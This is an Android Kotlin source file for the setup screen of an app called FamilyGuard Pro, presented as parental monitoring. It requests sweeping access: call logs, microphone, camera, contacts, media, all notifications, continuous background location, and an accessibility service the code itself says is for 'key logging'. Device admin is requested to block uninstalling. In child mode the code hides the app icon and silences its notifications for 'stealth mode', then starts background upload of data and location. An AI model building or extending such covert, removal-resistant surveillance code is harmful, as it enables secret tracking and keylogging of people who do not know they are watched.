package com.familyguardpro

import android.Manifest
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.familyguardpro.databinding.ActivitySetupBinding
import com.familyguardpro.services.DeviceAdminReceiver
import com.familyguardpro.utils.HideUtils
import com.familyguardpro.utils.PreferenceManager
import com.google.firebase.messaging.FirebaseMessaging
import kotlinx.coroutines.launch
import com.familyguardpro.network.ApiClient

class SetupActivity : AppCompatActivity() {

    private lateinit var binding: ActivitySetupBinding
    private lateinit var preferenceManager: PreferenceManager
    private var currentStep = 0
    private val skippedSteps = mutableSetOf<Int>()

    private val permissions = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.WRITE_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CAMERA,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.POST_NOTIFICATIONS
    )

    private val mediaPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        arrayOf(
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO
        )
    } else {
        arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
    }

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.all { it.value }
        if (allGranted) {
            proceedToNextStep()
        } else {
            Toast.makeText(this, "All permissions required for protection", Toast.LENGTH_LONG).show()
        }
        updateUI()
    }

    private val deviceAdminLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK) {
            proceedToNextStep()
        }
        updateUI()
    }

    private val overlayLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        if (Settings.canDrawOverlays(this)) {
            proceedToNextStep()
        } else {
            showRetryOrSkipDialog("Display Overlay")
        }
    }

    private val usageStatsLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        if (hasUsageStatsPermission()) {
            proceedToNextStep()
        } else {
            showRetryOrSkipDialog("Usage Stats")
        }
    }

    private val accessibilityLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        if (isAccessibilityServiceEnabled()) {
            proceedToNextStep()
        } else {
            showRetryOrSkipDialog("Accessibility Service")
        }
    }

    private val notificationListenerLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        if (isNotificationListenerEnabled()) {
            proceedToNextStep()
        } else {
            // Show a retry option or allow skip
            showRetryOrSkipDialog("Notification Access")
        }
    }

    private val batteryOptimizationLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        // Always proceed after returning from battery settings
        // The permission might be granted directly by the system dialog
        if (isIgnoringBatteryOptimizations()) {
            proceedToNextStep()
        } else {
            // User denied or cancelled - ask to retry or skip
            showRetryOrSkipDialog("Battery Optimization")
        }
    }

    private val backgroundLocationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { granted ->
        if (granted) {
            proceedToNextStep()
        } else {
            showRetryOrSkipDialog("Background Location")
        }
        updateUI()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivitySetupBinding.inflate(layoutInflater)
        setContentView(binding.root)
        
        preferenceManager = PreferenceManager(this)
        
        setupUI()
        updateUI()
    }

    private fun setupUI() {
        binding.btnAction.setOnClickListener {
            grantCurrentStepPermission()
        }
        
        binding.tvSkip.setOnClickListener {
            skippedSteps.add(currentStep)
            updateUI()
        }
    }

    private fun showRetryOrSkipDialog(permissionName: String) {
        AlertDialog.Builder(this)
            .setTitle("Permission Required")
            .setMessage("$permissionName permission is important for full protection. Would you like to try again or skip for now?")
            .setPositiveButton("Try Again") { _, _ ->
                grantCurrentStepPermission()
            }
            .setNegativeButton("Skip") { _, _ ->
                skippedSteps.add(currentStep)
                updateUI()
            }
            .setCancelable(false)
            .show()
    }

    private fun updateUI() {
        val steps = listOf(
            SetupStep("Basic Permissions", "Location, Call Log, Camera, Microphone", ::hasBasicPermissions),
            SetupStep("Media Access", "Photos, Videos, Audio files", ::hasMediaPermissions),
            SetupStep("Usage Stats", "App usage monitoring", ::hasUsageStatsPermission),
            SetupStep("Notification Access", "Read all notifications", ::isNotificationListenerEnabled),
            SetupStep("Display Overlay", "App blocking capability", ::hasOverlayPermission),
            SetupStep("Battery Optimization", "Background operation", ::isIgnoringBatteryOptimizations),
            SetupStep("Background Location", "Continuous location tracking", ::hasBackgroundLocationPermission),
            SetupStep("Accessibility Service", "Enhanced monitoring & control", ::isAccessibilityServiceEnabled),
            SetupStep("Device Admin", "Uninstall protection", ::isDeviceAdminEnabled)
        )
        
        // Find first incomplete step that is not skipped
        currentStep = -1
        steps.forEachIndexed { index, step ->
            if (currentStep == -1 && !step.checker() && !skippedSteps.contains(index)) {
                currentStep = index
            }
        }
        if (currentStep == -1) currentStep = steps.size
        
        binding.tvStepNumber.text = "Step ${minOf(currentStep + 1, steps.size)} of ${steps.size}"
        binding.progressIndicator.progress = minOf(currentStep + 1, steps.size)
        
        if (currentStep < steps.size) {
            binding.tvStepTitle.text = steps[currentStep].title
            binding.tvStepDescription.text = steps[currentStep].description
            binding.btnAction.isEnabled = true
            binding.btnAction.text = getString(R.string.grant_permission)
        } else {
            binding.tvStepTitle.text = "All Permissions Granted!"
            binding.tvStepDescription.text = "Tap Complete to finish setup"
            binding.btnAction.isEnabled = true
            binding.btnAction.text = getString(R.string.complete)
            binding.btnAction.setOnClickListener {
                completeSetup()
            }
        }
    }

    private fun grantCurrentStepPermission() {
        when (currentStep) {
            0 -> requestBasicPermissions()
            1 -> requestMediaPermissions()
            2 -> requestUsageStatsPermission()
            3 -> requestNotificationListenerPermission()
            4 -> requestOverlayPermission()
            5 -> requestBatteryOptimization()
            6 -> requestBackgroundLocation()
            7 -> requestAccessibilityService()
            8 -> requestDeviceAdmin()
        }
    }

    private fun proceedToNextStep() {
        currentStep++
        updateUI()
    }

    private fun hasBasicPermissions(): Boolean {
        return permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun hasMediaPermissions(): Boolean {
        return mediaPermissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun hasUsageStatsPermission(): Boolean {
        val appOps = getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
        val mode = appOps.checkOpNoThrow(
            android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
            android.os.Process.myUid(),
            packageName
        )
        return mode == android.app.AppOpsManager.MODE_ALLOWED
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val packageName = packageName
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat?.contains(packageName) == true
    }

    private fun hasOverlayPermission(): Boolean {
        return Settings.canDrawOverlays(this)
    }

    private fun isIgnoringBatteryOptimizations(): Boolean {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    private fun hasBackgroundLocationPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            ContextCompat.checkSelfPermission(
                this, Manifest.permission.ACCESS_BACKGROUND_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
    }

    private fun isDeviceAdminEnabled(): Boolean {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)
        return dpm.isAdminActive(adminComponent)
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val accessibilityServiceName = "$packageName/.services.FamilyGuardAccessibilityService"
        val enabledServices = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        return enabledServices?.contains(accessibilityServiceName) == true ||
               enabledServices?.contains("$packageName/") == true
    }

    private fun requestBasicPermissions() {
        val neededPermissions = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (neededPermissions.isNotEmpty()) {
            permissionLauncher.launch(neededPermissions.toTypedArray())
        } else {
            proceedToNextStep()
        }
    }

    private fun requestMediaPermissions() {
        val neededPermissions = mediaPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (neededPermissions.isNotEmpty()) {
            permissionLauncher.launch(neededPermissions.toTypedArray())
        } else {
            proceedToNextStep()
        }
    }

    private fun requestUsageStatsPermission() {
        AlertDialog.Builder(this)
            .setTitle("Usage Stats Permission")
            .setMessage("Enable usage access for FamilyGuard Pro to monitor app usage.")
            .setPositiveButton("Open Settings") { _, _ ->
                usageStatsLauncher.launch(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun requestNotificationListenerPermission() {
        AlertDialog.Builder(this)
            .setTitle("Notification Access")
            .setMessage("Enable notification access to monitor all notifications.")
            .setPositiveButton("Open Settings") { _, _ ->
                notificationListenerLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun requestOverlayPermission() {
        AlertDialog.Builder(this)
            .setTitle("Display Over Apps")
            .setMessage("Enable overlay permission for app blocking feature.")
            .setPositiveButton("Open Settings") { _, _ ->
                val intent = Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:$packageName")
                )
                overlayLauncher.launch(intent)
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun requestBatteryOptimization() {
        AlertDialog.Builder(this)
            .setTitle("Battery Optimization")
            .setMessage("Disable battery optimization to ensure continuous protection.")
            .setPositiveButton("Open Settings") { _, _ ->
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                batteryOptimizationLauncher.launch(intent)
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun requestBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            AlertDialog.Builder(this)
                .setTitle("Background Location")
                .setMessage("Allow 'All the time' location access for continuous tracking.")
                .setPositiveButton("Grant") { _, _ ->
                    backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                }
                .setNegativeButton("Cancel", null)
                .show()
        } else {
            proceedToNextStep()
        }
    }

    private fun requestAccessibilityService() {
        AlertDialog.Builder(this)
            .setTitle("Accessibility Service")
            .setMessage("Enable accessibility service for enhanced monitoring, app blocking, and key logging. Find 'FamilyGuard Pro' in the list and enable it.")
            .setPositiveButton("Open Settings") { _, _ ->
                accessibilityLauncher.launch(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
            .setNegativeButton("Skip") { _, _ ->
                proceedToNextStep()
            }
            .setCancelable(false)
            .show()
    }

    private fun requestDeviceAdmin() {
        val adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enable to protect against unauthorized uninstall")
        }
        deviceAdminLauncher.launch(intent)
    }

    private fun completeSetup() {
        binding.btnAction.isEnabled = false
        
        // Register FCM token
        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            if (task.isSuccessful) {
                val token = task.result
                preferenceManager.setFcmToken(token)
                
                // Update token on server
                lifecycleScope.launch {
                    try {
                        val deviceId = preferenceManager.getDeviceId()
                        ApiClient.api.updateFcmToken(
                            deviceId,
                            mapOf("fcmToken" to token)
                        )
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                }
            }
            
            // Report permissions to server
            com.familyguardpro.utils.PermissionReporter.reportPermissions(this)
            
            // Hide app icon
            if (preferenceManager.isChildMode()) {
                HideUtils.hideAppIcon(this)
                preferenceManager.setAppHidden(true)
                
                // Disable app notifications for stealth mode
                (application as FamilyGuardApp).disableAppNotifications()
            }
            
            // Start background services
            startBackgroundServices()
            
            Toast.makeText(this, "Setup complete!", Toast.LENGTH_SHORT).show()
            
            // Navigate to child status activity
            startActivity(Intent(this, ChildStatusActivity::class.java))
            finish()
        }
    }

    private fun startBackgroundServices() {
        // Start data sync worker for periodic sync
        com.familyguardpro.services.DataSyncWorker.schedulePeriodicSync(this)
        
        // Run immediate sync to upload initial data
        com.familyguardpro.services.DataSyncWorker.runImmediateSync(this)
        
        // Start location service
        val locationIntent = Intent(this, com.familyguardpro.services.LocationService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(locationIntent)
        } else {
            startService(locationIntent)
        }
    }

    data class SetupStep(
        val title: String,
        val description: String,
        val checker: () -> Boolean
    )
}
